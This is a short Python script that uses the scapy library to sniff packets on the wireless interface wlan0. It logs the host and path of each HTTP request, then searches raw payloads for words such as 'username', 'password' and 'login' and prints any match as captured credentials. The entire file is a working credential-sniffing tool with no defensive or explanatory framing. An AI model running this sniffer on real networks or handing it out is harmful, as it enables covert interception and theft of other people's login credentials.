#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packed)


def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        path = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] File path>>\t" + path + "\n")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "password", "user", "pass", "login", "usr", "pwd"]
            for keyword in keywords:
                if keyword in load:
                    print ("\n\n\n[+] Username and Password>>" + load + "\n\n\n")
                    break


sniff("wlan0")
